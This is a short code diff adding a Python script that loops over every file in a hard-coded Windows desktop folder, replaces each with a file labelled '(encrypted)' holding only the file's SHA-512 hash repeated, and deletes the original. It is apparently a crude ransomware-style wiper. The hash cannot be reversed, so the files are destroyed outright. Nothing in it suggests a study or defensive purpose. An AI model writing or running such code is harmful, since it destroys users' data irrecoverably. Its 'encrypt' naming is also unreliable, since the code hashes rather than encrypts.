@@ -1,0 +1,16 @@
+import hashlib
+import os
+caminho = "C:\Users\User\Desktop\py"
+
+for files in os.listdir(caminho):
+    os.chdir(caminho)
+    with open(files, 'rb') as r:
+        data = r.read()
+        encrypt = hashlib.sha512(data).hexdigest()
+        new_file = '(encrypted) '+os.path.basename(files)
+        with open(new_file, 'wb') as n:
+            n.write(encrypt*0xFF)
+            n.close()
+            r.close()
+
+            os.remove(files)
